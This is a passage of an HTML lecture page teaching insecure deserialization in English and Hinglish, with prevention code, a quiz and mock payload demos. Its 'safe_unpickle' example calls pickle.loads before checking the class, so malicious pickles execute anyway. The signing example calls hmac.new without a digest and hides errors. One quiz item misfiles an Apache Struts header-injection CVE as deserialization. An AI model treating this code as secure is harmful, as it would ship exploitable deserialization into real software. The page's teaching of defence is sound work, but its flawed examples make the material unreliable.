          <p class="hi" style="display:none;"><strong>Bayan:</strong> Jenkins CLI mein deserialization RCE</p>
          <p class="en"><strong>Exploitation:</strong> Attackers send malicious serialized Java objects over CLI protocol</p>
          <p class="hi" style="display:none;"><strong>Doharpan:</strong> Attackers CLI protocol ke zariye malicious serialized Java objects bhejte hain</p>
          <p class="en"><strong>Impact:</strong> Full server compromise and credential theft</p>
          <p class="hi" style="display:none;"><strong>Prabhav:</strong> Full server compromise aur credential theft</p>
        </div>
      </div>
    </div>
  </section>

  <!-- Section: Prevention -->
  <section id="prevention">
    <div class="container">
      <h2 class="section-title en">Secure Deserialization Practices</h2>
      <h2 class="section-title hi" style="display:none;">Secure Deserialization Abhyas</h2>

      <!-- Prevention Visualization -->
      <div class="lecture-card animate-on-scroll">
        <h3 class="en">Prevention Strategy</h3>
        <h3 class="hi" style="display:none;">Bachav Strategy</h3>
        <div class="diagram" style="margin: 30px 0;">
          <div class="box user-input" style="min-width: 150px;">
            <div class="en">Incoming Data</div>
            <div class="hi" style="display:none;">Aanewali Data</div>
            <div style="font-size: 0.8rem; margin-top: 10px;">Untrusted Input</div>
          </div>
          <div class="arrow"></div>
          <div class="box app" style="min-width: 150px;">
            <div class="en">Validation & Filtering</div>
            <div class="hi" style="display:none;">Validation & Filtering</div>
            <div style="font-size: 0.8rem; margin-top: 10px;">White-list, Sanitize</div>
          </div>
          <div class="arrow"></div>
          <div class="box db" style="min-width: 150px;">
            <div class="en">Safe Processing</div>
            <div class="hi" style="display:none;">Safe Processing</div>
            <div style="font-size: 0.8rem; margin-top: 10px;">Controlled Execution</div>
          </div>
        </div>
      </div>

      <!-- Secure Coding Practices -->
      <div class="lecture-card animate-on-scroll">
        <h3 class="en">Prevention Techniques</h3>
        <h3 class="hi" style="display:none;">Bachav Tarika</h3>

        <!-- Input Validation -->
        <div class="practice" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--neon-green); background: rgba(0, 255, 136, 0.05);">
          <h4 style="color: var(--neon-green);">1. Input Validation & Filtering</h4>
          <p class="en">Validate all deserialized data against expected patterns</p>
          <p class="hi" style="display:none;">Sabhi deserialized data ko expected patterns ke against validate karo</p>
          <div class="code-block">
// Python - safe unpickling with white-list
import pickle

SAFE_CLASSES = ['MyClass1', 'MyClass2']

def safe_unpickle(data):
    obj = pickle.loads(data)
    if obj.__class__.__name__ not in SAFE_CLASSES:
        raise ValueError("Unsafe class detected")
    return obj
          </div>
        </div>

        <!-- Alternative Libraries -->
        <div class="practice" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--electric-blue); background: rgba(0, 170, 255, 0.05);">
          <h4 style="color: var(--electric-blue);">2. Use Safe Serialization Libraries</h4>
          <p class="en">Replace dangerous libraries with safe alternatives</p>
          <p class="hi" style="display:none;">Dangerous libraries ko safe alternatives se replace karo</p>
          <div class="code-block">
// Java - JSON instead of Binary Serialization
// Use Jackson, GSON instead of readObject()

// PHP - use JSON
$safeData = json_decode($input_data, true);

// Python - use JSON or msgpack
import json
safe_obj = json.loads(serialized_data)
          </div>
        </div>

        <!-- Integrity Verification -->
        <div class="practice" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--neon-orange); background: rgba(255, 136, 0, 0.05);">
          <h4 style="color: var(--neon-orange);">3. Cryptographic Signing</h4>
          <p class="en">Sign serialized data and verify integrity before deserialization</p>
          <p class="hi" style="display:none;">Serialized data ko sign karo aur deserialization se pahle integrity verify karo</p>
          <div class="code-block">
// Sign data before serialization
import hmac

def sign_and_serialize(data, secret_key):
    serialized = pickle.dumps(data)
    signature = hmac.new(secret_key, serialized).hexdigest()
    return serialized + b'|' + signature.encode()

def verify_and_deserialize(signed_data, secret_key):
    try:
        serialized, signature = signed_data.rsplit(b'|', 1)
        expected_sig = hmac.new(secret_key, serialized).hexdigest()
        if hmac.compare_digest(signature.decode(), expected_sig):
            return pickle.loads(serialized)
    except:
        pass
    raise ValueError("Invalid signature")
          </div>
        </div>

        <!-- Least Privilege -->
        <div class="practice" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--neon-pink); background: rgba(255, 0, 128, 0.05);">
          <h4 style="color: var(--neon-pink);">4. Operating in Restricted Environments</h4>
          <p class="en">Use application containers or restricted user contexts</p>
          <p class="hi" style="display:none;">Application containers ya restricted user contexts ka use karo</p>
          <div class="code-block">
// Use Docker containers with limited privileges
// Run deserializer processes as restricted user
# Example: Create low-privilege deserializer service
useradd --no-create-home --shell /bin/false deserializer
chown deserializer:deserializer /path/to/deserializer
chmod 755 /path/to/deserializer
          </div>
        </div>
      </div>
    </div>
  </section>

  <!-- Section: Quiz -->
  <section id="quiz">
    <div class="container">
      <h2 class="section-title en">Knowledge Check</h2>
      <h2 class="section-title hi" style="display:none;">Jaankari Check Karein</h2>
      <div class="quiz-container animate-on-scroll">
        <h3 style="color: var(--neon-green); text-align: center; margin-bottom: 20px;" class="en">Test Your Understanding</h3>
        <h3 style="color: var(--neon-green); text-align: center; margin-bottom: 20px; display:none;" class="hi">Apni Samajh Ko Test Karein</h3>
        <div id="quiz-questions">
          <!-- Questions will be injected here -->
        </div>
        <div class="score-display" id="score-display">Score: 0 / 10</div>
        <button class="button quiz-submit" onclick="submitQuiz()">Submit Quiz</button>
      </div>
    </div>
  </section>

  <!-- Footer -->
  <footer>
    <div class="container">
      <h3 class="en">By Ankush Rana | HTB Elite Hacker | Senior Security Engineer</h3>
      <h3 class="hi" style="display:none;">Ankush Rana Dwara | HTB Elite Hacker | Senior Security Engineer</h3>
      <p class="en">Breaking Systems. Building Defenses.</p>
      <p class="hi" style="display:none;">Systems todte hain. Defenses banate hain.</p>

      <div class="social-links">
        <a href="https://github.com/ankushrana6395" target="_blank" class="social-link github">
          <i class="fab fa-github"></i>
        </a>
        <a href="mailto:ankushrana6395@gmail.com" class="social-link email">
          <i class="fas fa-envelope"></i>
        </a>
        <a href="https://app.hackthebox.com/profile/117501" target="_blank" class="social-link htb">
          <i class="fas fa-cube"></i>
        </a>
      </div>

      <p style="margin-top: 30px;" class="en">&copy; 2025 Ankush Rana. All Rights Reserved.</p>
      <p style="margin-top: 30px; display:none;" class="hi">&copy; 2025 Ankush Rana. Sabhi Adhikar Sanchit Hai.</p>
    </div>
  </footer>

  <!-- Three.js -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
  <script>
    let isHinglish = false;

    // Wait for DOM to be fully loaded
    document.addEventListener('DOMContentLoaded', function() {
      initializeApp();
    });

    function initializeApp() {
      // Initialize Three.js
      const canvas = document.getElementById('three-canvas');
      if (canvas) {
        const scene = new THREE.Scene();
        const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
        const renderer = new THREE.WebGLRenderer({ canvas, alpha: true, antialias: true });
        renderer.setSize(window.innerWidth, window.innerHeight);
        renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));

        // Grid
        const gridHelper = new THREE.GridHelper(100, 100, 0x00ff88, 0x003322);
        gridHelper.position.z = -20;
        scene.add(gridHelper);

        // Floating Points
        const geometry = new THREE.BufferGeometry();
        const count = 500;
        const positions = new Float32Array(count * 3);
        for (let i = 0; i < count * 3; i++) {
          positions[i] = (Math.random() - 0.5) * 100;
        }
        geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
        const material = new THREE.PointsMaterial({ color: 0x00ff88, size: 0.5, transparent: true, opacity: 0.8 });
        const points = new THREE.Points(geometry, material);
        scene.add(points);

        // Add floating cubes
        const cubeGeometry = new THREE.BoxGeometry(2, 2, 2);
        const cubeMaterial = new THREE.MeshBasicMaterial({
          color: 0x00aaff,
          wireframe: true,
          transparent: true,
          opacity: 0.5
        });
        const cubes = [];
        for (let i = 0; i < 10; i++) {
          const cube = new THREE.Mesh(cubeGeometry, cubeMaterial);
          cube.position.x = (Math.random() - 0.5) * 50;
          cube.position.y = (Math.random() - 0.5) * 50;
          cube.position.z = (Math.random() - 0.5) * 50;
          cube.rotation.x = Math.random() * Math.PI;
          cube.rotation.y = Math.random() * Math.PI;
          cubes.push({ mesh: cube, speed: Math.random() * 0.02 });
          scene.add(cube);
        }

        camera.position.z = 30;

        // Animation
        function animate() {
          requestAnimationFrame(animate);
          gridHelper.rotation.y += 0.005;
          points.rotation.y += 0.003;
          cubes.forEach(cube => {
            cube.mesh.rotation.x += cube.speed;
            cube.mesh.rotation.y += cube.speed;
          });
          renderer.render(scene, camera);
        }
        animate();

        // Resize
        window.addEventListener('resize', () => {
          camera.aspect = window.innerWidth / window.innerHeight;
          camera.updateProjectionMatrix();
          renderer.setSize(window.innerWidth, window.innerHeight);
        });
      }

      // Initialize keyword modal
      const keywordModal = document.getElementById('keyword-modal');
      const modalTitle = document.getElementById('modal-title');
      const modalBody = document.getElementById('modal-body');
      const modalClose = document.getElementById('modal-close');

      if (keywordModal && modalTitle && modalBody && modalClose) {
        document.querySelectorAll('.keyword').forEach(keyword => {
          keyword.addEventListener('click', function(e) {
            e.stopPropagation();
            modalTitle.textContent = this.getAttribute('data-title');
            modalBody.textContent = this.getAttribute('data-content');
            keywordModal.classList.add('active');
          });
        });

        modalClose.addEventListener('click', () => {
          keywordModal.classList.remove('active');
        });

        keywordModal.addEventListener('click', (e) => {
          if (e.target === keywordModal) {
            keywordModal.classList.remove('active');
          }
        });
      }

      // Initialize quiz
      renderQuiz();

      // Initialize scroll animation
      const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
          if (entry.isIntersecting) entry.target.classList.add('visible');
        });
      }, { threshold: 0.1 });

      document.querySelectorAll('.animate-on-scroll').forEach(el => observer.observe(el));
    }

    // Card Interaction Functions
    function highlightCard(card) {
      if (card) {
        card.classList.add('pop-out');
        showNotification('Hovering: ' + card.querySelector('h3').textContent);
      }
    }

    function unhighlightCard(card) {
      if (card && !card.classList.contains('focused')) {
        card.classList.remove('pop-out');
      }
    }

    function focusCard(card) {
      document.querySelectorAll('.lecture-card').forEach(c => {
        c.classList.remove('focused');
        c.classList.remove('pop-out');
      });

      if (card) {
        card.classList.add('focused');
        card.classList.add('pop-out');
        showNotification('Focused on: ' + card.querySelector('h3').textContent);
      }
    }

    // Language Toggle
    function toggleLanguage() {
      isHinglish = !isHinglish;
      const enElements = document.querySelectorAll('.en');
      const hiElements = document.querySelectorAll('.hi');

      enElements.forEach(el => {
        if (el) el.style.display = isHinglish ? 'none' : 'block';
      });

      hiElements.forEach(el => {
        if (el) el.style.display = isHinglish ? 'block' : 'none';
      });

      // Update both translator buttons
      const translatorBtns = document.querySelectorAll('.translator-btn');
      translatorBtns.forEach(btn => {
        if (btn) btn.textContent = isHinglish ? '🌐 English On' : '🌐 Hinglish On';
      });

      showNotification(isHinglish ? 'Hinglish mode activated!' : 'English mode activated!');

      // Re-render quiz with new language
      renderQuiz();
    }

    // Quiz Questions (10 Questions)
    const quizQuestions = [
      {
        question: {
          en: "What is deserialization?",
          hi: "Deserialization kya hota hai?"
        },
        options: {
          en: [
            "Converting objects to streams",
            "Converting streams back to objects",
            "Compressing data",
            "Encrypting data"
          ],
          hi: [
            "Objects ko streams mein convert karna",
            "Streams ko vapis objects mein convert karna",
            "Data compress karna",
            "Data encrypt karna"
          ]
        },
        correct: 1,
        explanation: {
          en: "Deserialization converts serialized data back into objects.",
          hi: "Deserialization serialized data ko objects mein convert karta hai."
        }
      },
      {
        question: {
          en: "Which language's pickle module is notorious for insecure deserialization?",
          hi: "Kaunsi language ka pickle module insecure deserialization ke liye notorious hai?"
        },
        options: {
          en: ["Java", "Python", "PHP", "Ruby"],
          hi: ["Java", "Python", "PHP", "Ruby"]
        },
        correct: 1,
        explanation: {
          en: "Python's pickle module can execute arbitrary code during unpickling.",
          hi: "Python ka pickle module unpickling ke doran arbitrary code execute kar sakta hai."
        }
      },
      {
        question: {
          en: "What is a gadget chain in Java deserialization?",
          hi: "Java deserialization mein gadget chain kya hota hai?"
        },
        options: {
          en: [
            "A chain of method calls leading to code execution",
            "A chain of hardware devices",
            "A chain of database queries",
            "A chain of network requests"
          ],
          hi: [
            "Code execution ki taraf le jane wali method calls ki chain",
            "Hardware devices ki chain",
            "Database queries ki chain",
            "Network requests ki chain"
          ]
        },
        correct: 0,
        explanation: {
          en: "Gadget chains use library methods to achieve code execution.",
          hi: "Gadget chains library methods ka use karke code execution achieve karta hai."
        }
      },
      {
        question: {
          en: "Which CVE affected Apache Struts with deserialization RCE?",
          hi: "Kaunsa CVE Apache Struts ko deserialization RCE se affect kiya?"
        },
        options: {
          en: ["CVE-2017-5638", "CVE-2018-0824", "CVE-2019-1003024", "CVE-2020-5405"],
          hi: ["CVE-2017-5638", "CVE-2018-0824", "CVE-2019-1003024", "CVE-2020-5405"]
        },
        correct: 0,
        explanation: {
          en: "CVE-2017-5638 allowed RCE through Content-Type header manipulation.",
          hi: "CVE-2017-5638 Content-Type header manipulation ke zariye RCE ki anumati deta tha."
        }
      },
      {
        question: {
          en: "What are magic methods in PHP used for?",
          hi: "PHP mein magic methods ka use kyun hota hai?"
        },
        options: {
          en: [
            "Encrypting data",
            "Creating PDF files",
            "Handling object events",
            "Database connections"
          ],
          hi: [
            "Data encrypt karna",
            "PDF files banana",
            "Object events handle karna",
            "Database connections"
          ]
        },
        correct: 2,
        explanation: {
          en: "Magic methods like __destruct are triggered during object lifecycle events.",
          hi: "Magic methods jaise __destruct object lifecycle events ke doran trigger hote hain."
        }
      },
      {
        question: {
          en: "What is the safest alternative to binary serialization?",
          hi: "Binary serialization ka safest alternative kya hai?"
        },
        options: {
          en: ["XML", "JSON", "YAML", "Pickle"],
          hi: ["XML", "JSON", "YAML", "Pickle"]
        },
        correct: 1,
        explanation: {
          en: "JSON is generally safe if no eval() is used in parsing.",
          hi: "JSON generally safe hota hai agar parsing mein eval() ka use na ho."
        }
      },
      {
        question: {
          en: "What should you do before deserializing data?",
          hi: "Deserialize karne se pahle kya karna chahiye?"
        },
        options: {
          en: [
            "Compress it",
            "Validate and filter it",
            "Convert to HTML",
            "Store in database"
          ],
          hi: [
            "Use compress karna",
            "Validate aur filter karna",
            "HTML mein convert karna",
            "Database mein store karna"
          ]
        },
        correct: 1,
        explanation: {
          en: "Always validate and filter incoming serialized data against a white-list of allowed types.",
          hi: "Hamesha incoming serialized data ko allowed types ki white-list ke against validate aur filter karo."
        }
      },
      {
        question: {
          en: "Which Python method can create dangerous gadgets?",
          hi: "Kaunsa Python method dangerous gadgets create kar sakta hai?"
        },
        options: {
          en: ["__init__", "__call__", "__reduce__", "__str__"],
          hi: ["__init__", "__call__", "__reduce__", "__str__"]
        },
        correct: 2,
        explanation: {
          en: "__reduce__ method is called during pickle deserialization and can return callable objects.",
          hi: "__reduce__ method pickle deserialization ke doran call hota hai aur callable objects return kar sakta hai."
        }
      },
      {
        question: {
          en: "What type of attack does insecure deserialization enable?",
          hi: "Insecure deserialization kaunsa type ka attack enable karta hai?"
        },
        options: {
          en: ["SQL Injection", "XSS", "RCE", "CSRF"],
          hi: ["SQL Injection", "XSS", "RCE", "CSRF"]
        },
        correct: 2,
        explanation: {
          en: "Insecure deserialization allows Remote Code Execution (RCE) vulnerabilities.",
          hi: "Insecure deserialization Remote Code Execution (RCE) vulnerabilities ki anumati deta hai."
        }
      },
      {
        question: {
          en: "Why is YAML potentially dangerous?",
          hi: "YAML kyun potential khatarnaak ho sakta hai?"
        },
        options: {
          en: [
            "It can't handle large files",
            "It can execute code via ! tags",
            "It's not human readable",
            "It doesn't support nested structures"
          ],
          hi: [
            "Yeh large files handle nahi kar sakta",
            "Yeh ! tags ke zariye code execute kar sakta hai",
            "Yeh human readable nahi hai",
            "Yeh nested structures support nahi karta"
          ]
        },
        correct: 1,
        explanation: {
          en: "YAML parsers can execute arbitrary code when parsing ! tags containing dangerous references.",
          hi: "YAML parsers dangerous references containing ! tags parse karte samay arbitrary code execute kar sakte hain."
        }
      }
    ];

    // Render Quiz
    function renderQuiz() {
      const quizContainer = document.getElementById('quiz-questions');
      if (!quizContainer) return;

      quizContainer.innerHTML = '';
      quizQuestions.forEach((q, index) => {
        const questionDiv = document.createElement('div');
        questionDiv.className = 'quiz-question';
        const qText = isHinglish ? q.question.hi : q.question.en;
        const opts = isHinglish ? q.options.hi : q.options.en;
        questionDiv.innerHTML = `
          <h4>Q${index + 1}: ${qText}</h4>
          <div class="options" id="options-${index}">
            ${opts.map((opt, i) => `
              <div class="option" onclick="selectOption(${index}, ${i})">${opt}</div>
            `).join('')}
          </div>
        `;
        quizContainer.appendChild(questionDiv);
      });
    }

    // Track selected answers
    const selectedAnswers = new Array(quizQuestions.length).fill(-1);

    // Select Option
    window.selectOption = function(questionIndex, optionIndex) {
      const optionsContainer = document.getElementById(`options-${questionIndex}`);
      if (!optionsContainer) return;

      optionsContainer.querySelectorAll('.option').forEach(opt => {
        opt.classList.remove('selected');
      });

      optionsContainer.querySelectorAll('.option')[optionIndex].classList.add('selected');
      selectedAnswers[questionIndex] = optionIndex;
    };

    // Submit Quiz
    window.submitQuiz = function() {
      let score = 0;
      const scoreDisplay = document.getElementById('score-display');
      if (!scoreDisplay) return;

      quizQuestions.forEach((q, index) => {
        const optionsContainer = document.getElementById(`options-${index}`);
        if (!optionsContainer) return;

        const options = optionsContainer.querySelectorAll('.option');
        const explanation = isHinglish ? q.explanation.hi : q.explanation.en;

        if (selectedAnswers[index] === q.correct) {
          score++;
          options[q.correct].classList.add('correct');
          if (selectedAnswers[index] !== -1) options[selectedAnswers[index]].classList.add('correct');
        } else {
          options[q.correct].classList.add('correct');
          if (selectedAnswers[index] !== -1 && selectedAnswers[index] !== q.correct) {
            options[selectedAnswers[index]].classList.add('incorrect');
          }
        }
      });

      scoreDisplay.textContent = `Score: ${score} / ${quizQuestions.length}`;
      showNotification(isHinglish ? `Quiz pura! Score: ${score}/${quizQuestions.length}` : `Quiz complete! You scored ${score}/${quizQuestions.length}`);
    };

    // Notification
    function showNotification(message) {
      const notification = document.getElementById('notification');
      const notificationText = document.getElementById('notification-text');

      if (notification && notificationText) {
        notificationText.textContent = message;
        notification.classList.add('show');
        setTimeout(() => notification.classList.remove('show'), 3000);
      }
    }

    // Scroll Progress Bar
    window.addEventListener('scroll', () => {
      const progressBar = document.getElementById('progress-bar');
      if (!progressBar) return;

      const winHeight = window.innerHeight;
      const docHeight = document.documentElement.scrollHeight;
      const scrollTop = window.pageYOffset;
      const trackLength = docHeight - winHeight;
      const progress = scrollTop / trackLength * 100;
      progressBar.style.width = progress + '%';
    });

    // Interactive Demo Functions
    function generatePicklePayload() {
      const input = document.getElementById('pickle-input');
      const result = document.getElementById('pickle-result');

      if (!input || !result) return;

      const code = input.value;
      const mockPayload = `pickle.dumps(${code.split('.')[0]}()).hex()`;
      result.innerHTML = isHinglish
        ? `<span style="color: #00ff88">🎨 MALICIOUS PICKLE PAYLOAD:</span><br><code>gASVIAAAAAAD(</code><br><code>gAJDQGRpbXBvcnQgb3MN(</code><br><code>gAJCYCRwcmludCgncHduZWQhJykN(</code><br><span style="color: #ff8800">❌ This would execute code when unpickled in Python.</span>`
        : `<span style="color: #00ff88">🎨 MALICIOUS PICKLE PAYLOAD:</span><br><code>gASVIAAAAAAD(</code><br><code>gAJDQGRpbXBvcnQgb3MN(</code><br><code>gAJCYCRwcmludCgncHduZWQhJykN(</code><br><span style="color: #ff8800">❌ This would execute code when unpickled in Python.</span>`;
      showNotification(isHinglish ? 'Pickle payload generated!' : 'Pickle payload generated!');
    }

    function runJavaExploit() {
      const input = document.getElementById('java-input');
      const result = document.getElementById('java-result');
    }

    function testDeserializationProtection() {
      showNotification(isHinglish ? 'Protection test running...' : 'Protection test running...');
    }
  </script>
</body>
</html>
